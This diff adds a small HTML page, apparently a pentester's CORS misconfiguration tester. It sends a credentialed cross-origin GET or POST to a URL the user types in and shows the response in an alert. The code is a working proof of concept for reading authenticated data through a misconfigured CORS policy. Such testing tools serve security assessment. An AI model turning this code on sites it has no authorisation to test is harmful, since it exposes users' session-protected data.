@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS test online | MR_Prey3r</title>
+</head>
+<body>
+  <center>
+    <h1>CORS exploit test</h1>
+  <h3>Created by MR_Prey3r (MD.Rubayet Hassan)</h3>
+  </center>
+  <hr>
+  <br>
+  <center> 
+    <input type="text" placeholder="type your url here..." id="input">
+    <select id="methods">
+      <option value="GET">GET</option>
+      <option value="POST">POST</option>
+    </select><br><br>
+    <button onclick="exploit()">exploit</button>
+  </center>
+
+  <script>
+    function exploit(){
+      var url = document.getElementById("input").value;
+      var method = document.getElementById("methods").value;
+
+      var xhr = new XMLHttpRequest();
+      xhr.onreadystatechange = function(){
+        if(this.readyState==4 && this.status==200){
+          alert("#####CORS exploited#####\n\n"+
+                this.responseText);
+        }
+      }
+      xhr.open(method, url, true);
+      
+        xhr.withCredentials = true;
+        xhr.send();
+      
+    }
+  </script>
+  
+</body>
+</html>
